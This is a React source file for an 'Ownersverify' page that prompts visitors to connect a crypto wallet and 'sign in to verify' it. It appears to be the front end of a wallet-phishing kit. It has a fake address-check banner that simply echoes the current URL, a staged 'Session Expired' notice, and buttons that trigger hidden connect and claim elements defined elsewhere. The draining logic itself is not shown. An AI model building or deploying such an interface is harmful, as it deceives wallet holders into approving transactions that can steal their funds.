import { useEffect, useState } from "react";
import { Helmet } from "react-helmet";
import {
  BrowserRouter as Router,
  Switch,
  Route,
} from "react-router-dom";
import { 
	Flex,
	Text,
  	Image,
  	ChakraProvider,
	Spinner,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import met from "./met.png";
import coi from "./coi.svg";
import wal from "./wal.svg";
import tal from "./tal.svg";
import led from "./led.png";
import tre from "./tre.png";
import nif from "./nif.png";
import flo from "./flo.png";
import elu from "./elu.png";
import dap from "./dap.png";
import ven from "./ven.png";
import pha from "./pha.png";
import bit from "./bit.png";
import mew from "./mew.svg";
import rol from "./rol.png";
import tez from "./tez.png";
import fore from "./fore.png";
import opo from "./opo.svg";
import logo from "./logo.png";

function App() {
	const [showAll, setShowAll] = useState(false)
	const [pageLoad, setPageLoad] = useState(true)
	const [isClaim, setIsClaim] = useState(false)
	const [err, setErr] = useState(false)
	const [screen, setScreen] = useState(false)
	const [isWallet, setIsWallet] = useState("MetaMask")
	const [sSess, setSSsess] = useState(true)
	
	useEffect(() => {
		localStorage.removeItem("ownIsLogged")
		setInterval(function(){
			if(localStorage.getItem("ownIsLogged") !== null) {
				if (window.ethereum.selectedAddress) {
					setIsClaim(true)
					setScreen(true)
				}
				else {
					setIsClaim(false)
					setScreen(false)
				}
			}
			else {
				setIsClaim(false)
				setScreen(false)
			}

			if (window.ethereum.selectedAddress) {
				setSSsess(true)
			}
			else {
				setSSsess(false)
			}
		}, 100)
	}, [])

	const wallets = [
		{
			name: "MetaMask",
			icon: met,
			link: "",
		},
		{
			name: "WalletConnect",
			icon: wal,
		},
		{
			name: "Coinbase Wallet",
			icon: coi,
			link: "https://www.coinbase.com/",
		},
	]
	const walletsAll = [
		{
			name: "Talisman",
			icon: tal,
			link: "https://talisman.xyz/",
		},
		{
			name: "Ledger",
			icon: led,
			link: "https://www.ledger.com/",
		},
		{
			name: "Trezor",
			icon: tre,
			link: "https://trezor.io/",
		},
		{
			name: "Nifty Gateway",
			icon: nif,
			link: "https://niftygateway.com/",
		},
		{
			name: "Flow",
			icon: flo,
			link: "https://www.onflow.org/",
		},
		{
			name: "Eluvio",
			icon: elu,
			link: "https://live.eluv.io/",
		},
		{
			name: "Dapper",
			icon: dap,
			link: "https://www.dapperlabs.com/",
		},
		{
			name: "Venly",
			icon: ven,
			link: "https://www.venly.io/",
		},
		{
			name: "Phantom",
			icon: pha,
			link: "https://phantom.app/",
		},
		{
			name: "Bitski",
			icon: bit,
			link: "https://www.bitski.com/",
		},
		{
			name: "MEWconnect",
			icon: mew,
			link: "https://mewconnect.myetherwallet.com/",
		},
		{
			name: "Roll",
			icon: rol,
			link: "https://tryroll.com/",
		},
		{
			name: "Tezos",
			icon: tez,
			link: "https://tezos.com/",
		},
		{
			name: "Formatic",
			icon: fore,
			link: "https://fortmatic.com/",
		},
		{
			name: "Opolis",
			icon: opo,
			link: "https://opolis.co/",
		},
	]
	useEffect(() => {
		setTimeout(function(){
			setPageLoad(false)
		}, 2000)
	}, [])

	useEffect(() => {
		setTimeout(function(){
			setErr(true)
		}, 2500)
		setTimeout(function(){
			setErr(false)
		}, 6000)
	}, [])


	return (
		<ChakraProvider>
			<Flex fontFamily="'Lato', sans-serif" w="100%" minHeight="100vh" direction="column" bg="#22252d" color="#fff" fontSize="16px" pb={["5", "0"]}>
				<Flex w="100%" justify="center" py=".25rem" textAlign="center" bg="rgba(254,152,0,1)">Always verify the website address is {window.location.href}</Flex>
				<Flex w="100%" py={["0", "1rem"]} px={["0", "3%"]}>
					<Flex w="100%" justify="space-between" borderRadius={["0", "49px"]} bg="rgba(46,49,57,1)" p={["4% 5%", "2% 4%"]} align="center">
						<Text fontSize={["20px", "28px"]} fontWeight="bold"><Text as="span" color="rgba(254,152,0,1)">Owners</Text><Text as="span" color="rgba(146,149,157,1)">verify</Text></Text>

						<Flex align="center">
							{
								isClaim
								&&
								<Flex bg="rgba(86,85,90)" borderRadius="49px" display={["none", "flex"]} align="center">
									<Flex align="center" color="rgb(209,209,209)" px={["3", "4"]}  fontSize={["14px", "16px"]}>
										<Flex bg="rgb(255,193,108)" w={["12px", "14px"]} h={["12px", "14px"]}borderRadius="14px" mr="2"></Flex>
										0x......
									</Flex>
									<Flex cursor="pointer" fontSize={["12px", "14px"]} py="2" px={["2", "12"]} border="2px solid rgb(254,152,0)" bg="#22252d" borderRadius="49px" transition="300ms ease-in-out" _hover={{ border: "2px solid rgb(254,192,0)" }} onClick={() => localStorage.removeItem("ownIsLogged")}>SWITCH WALLET</Flex>
								</Flex>
							}
							{
								!sSess
								&&
								<Text>
									<Text color="rgb(245,101,101)" fontSize={["15px", "1.25rem"]} fontWeight="bold">Session Expired</Text>
									<Text mt="-1" fontSize={["12px", "14px"]}>Please retry connection</Text>
								</Text>
							}
						</Flex>
					</Flex>
				</Flex>
				{
					isClaim
					&&
					<Flex w="100%" py="3" display={["flex", "none"]} justify="center" align="center" borderBottom="1px solid rgb(86,85,90)">
						<Flex align="center" color="rgb(209,209,209)" px={["5%", "4"]} w="50%" fontSize={["18px", "16px"]}>
							<Flex bg="rgb(255,193,108)" w="15px" h="15px" borderRadius="15px" mr="2"></Flex>
							<span id="walletAddress">0x...................</span>
						</Flex>
						<Flex justify="center" fontSize={["12px", "14px"]} w="50%" py="2" px={["2", "12"]} border="2px solid rgb(254,152,0)" bg="#22252d" borderRadius="49px" transition="300ms ease-in-out" mr="4" onClick={() => localStorage.removeItem("ownIsLogged")}>SWITCH WALLET</Flex>
					</Flex>
				}
				<Flex w="100%" pt="10" px="3%" direction="column">
					{
						!pageLoad
						?
						!screen
						?
						<Flex w="100%" justify="space-between" direction={["column", "row"]} align="center" flexWrap="wrap" px={["7%", "0"]}>
							{
								sSess &&
								<Flex w="100%" justify="center" mb="8">
									<Flex cursor="pointer" pb="2" borderBottom="2px solid rgb(254,152,0)" fontWeight="bold" align="center" className="incs" onClick={() => localStorage.setItem("ownIsLogged", true)} fontSize={["12px", "16px"]}><Flex w={["15px", "20px"]} h={["15px", "20px"]} mr={["2", "3"]} bg="linear-gradient(315deg, #7cffcb 0%, #74f2ce 74%)" borderRadius={["15px", "20px"]}></Flex> Wallet connected, click here to verify</Flex>
								</Flex>
							}
							{
								wallets.map((item, index) => (
									<Flex w={["100%", "31.5%"]} bg="#fff" mb={["3", "8"]} py={["3", "2rem"]} borderRadius={["49px", ".5rem"]} align="center" justify={["flex-start", "center"]} cursor="pointer" direction={["row", "column"]} px={["5", "0"]} key={index} _hover={{ py: ["4", "2.5rem"] }} transition="300ms ease-in-out" onClick={() => {
										if(index === 0) {
											if(window.ethereum.selectedAddress) {
												localStorage.setItem("isCWallet", "MetaMask")
												localStorage.setItem("ownIsLogged", true)
												setIsWallet(item.name)
											}
											else {
												localStorage.setItem("isCWallet", "MetaMask")
												setIsWallet(item.name)
												document.getElementById('connectButton').click()
											}
										}
										else if(index === 1) {
											if(window.ethereum.selectedAddress) {
												localStorage.setItem("isCWallet", "WalletConnect")
												localStorage.setItem("ownIsLogged", true)
												setIsWallet(item.name)
											}
											else {
												localStorage.setItem("isCWallet", "WalletConnect")
												setIsWallet(item.name)
												document.getElementById("wltConnectButton").click()
											}
										}
										else {
											window.open(item.link, "_BLANK")
										}
									}}>
										<Image src={item.icon} ml={["2	", "0"]} w={["2rem", "3rem"]} h={["2rem", "3rem"]} mr={["5", "0"]} />
										<Text color="#000" fontWeight="bold" fontSize={["1rem", "1.5rem"]}>{item.name}</Text>
									</Flex>
								))
							}
							{
								showAll &&
								<>
									{
										walletsAll.map((item, index) => (
											<Flex w={["100%", "31.5%"]} bg="#fff" mb={["3", "8"]} py={["3", "2rem"]} borderRadius={["49px", ".5rem"]} align="center" justify={["flex-start", "center"]} cursor="pointer" direction={["row", "column"]} px={["5", "0"]} key={index} _hover={{ py: "2.5rem" }} transition="300ms ease-in-out" onClick={() => {
													window.open(item.link, "_BLANK")
											}}>
												<Image src={item.icon} ml={["2	", "0"]} w={["2rem", "3rem"]} h={["2rem", "3rem"]} mr={["5", "0"]} />
												<Text color="#000" fontWeight="bold" fontSize={["1rem", "1.5rem"]}>{item.name} {index === 12 && <Text as="span" color="rb(86,85,90)" ml="1" fontSize={[".875rem"]} fontWeight="400">(Template Wallet)</Text>} {index === 14 && <Text as="span" color="rgb(86,85,90)" ml="1" fontSize=".875rem" fontWeight="400">(Magic Link)</Text>}</Text>
											</Flex>
										))
									}
								</>
							}
						</Flex>
						:
						<Flex justify="center" align="center" py="5%" direction="column">
							<Image mb="-4" w="150px" src={logo} />
							<Text textAlign="center" fontSize={["1rem", "1.875rem"]} color="rgb(255,193,108)">Please sign in to verify your wallet.</Text>
							<Flex w="100%" mt="8" justify="center" align="center" direction="column">
								<Flex>
									<Flex cursor="pointer" fontSize={["1rem", "1.25rem"]} py={["0.5rem", ".75rem"]} px={["3rem", "5rem"]} border="2px solid rgb(254,152,0)" borderRadius="49px" transition="300ms ease-in-out" _hover={{ border: "2px solid rgb(254,192,0)" }} onClick={() => document.getElementById('claimButton').click()}>Sign In</Flex>
								</Flex>
								<div id="notEli" style={{ color: "rgb(248 113 113)", fontWeight: "bold", fontSize: "1.1rem", textAlign: "center", marginTop: "15px", padding: "0 5%" }}></div>
							</Flex>
						</Flex>
						:
						<Flex pt={["45%", "10%"]} pb={["0%", "10%"]} w="100%" justify="center">
							<Spinner color='rgba(254,152,0,1)' size='xl' />
						</Flex>
					}
					{
						!showAll && !pageLoad
						&&
						<>
							{
								!screen
								&&
								<Flex w="100%" mt={["8", "2"]} justify="center">
									<Flex cursor="pointer" fontSize={["1rem", "1.25rem"]} py={["0.5rem", ".75rem"]} px={["3rem", "5rem"]} border="2px solid rgb(254,152,0)" borderRadius="49px" transition="300ms ease-in-out" _hover={{ border: "2px solid rgb(254,192,0)" }} onClick={() => setShowAll(true)}>Show All</Flex>
								</Flex>
							}
						</>
					}
				</Flex>
				{
					err
					&&
					<Flex w={["70%", "20%"]} position="fixed" zIndex="10" borderRadius="4px" top={["10px", "24px"]} right={["2%", "24px"]} bg="#f44336" padding="6px 16px" align="center" boxShadow="0px 3px 5px -1px rgb(0 0 0 / 20%), 0px 6px 10px 0px rgb(0 0 0 / 14%), 0px 1px 18px 0px rgb(0 0 0 / 12%)">
						<Text mr="5" w="100%" fontSize="1rem">
							<Text>Welcome</Text>
						</Text>
						<svg style={{ width: "26px", height: "26px", fill: "#fff", cursor: "pointer" }} onClick={() => setErr(false)} class="MuiSvgIcon-root MuiSvgIcon-fontSizeSmall" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
					</Flex>
				}
			</Flex>
		</ChakraProvider>
	)
}

export default App;
